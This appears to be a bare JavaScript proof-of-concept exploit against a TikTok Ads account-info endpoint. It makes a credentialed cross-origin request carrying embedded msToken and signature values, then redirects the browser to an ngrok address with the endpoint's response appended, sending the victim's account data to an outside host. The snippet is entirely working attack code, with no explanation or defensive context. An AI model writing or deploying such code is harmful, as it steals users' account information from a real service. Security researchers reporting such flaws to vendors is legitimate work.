var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://ads.tiktok.com/passport/account/info/v2/?aid=1583&msToken=tLGY_TuxRp76vmrKv5Z4A_lHpG7cR05WcFHBVf4yEhnNW1L6w6Ad7AcqrV6JSyPhiNErpyUBen2m97y15uXVzPhxJ_-PiJ0bc1DY6MDb3DSbE4XXx1hB4qXGjb28F0R26ng=&X-Bogus=DFSzsIVOZNvANHbAtx9aD0WdbToB&_signature=_02B4Z6wo00001AZJyHgAAIDALDAw7qNTwfgGSMzAAGWBc4");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
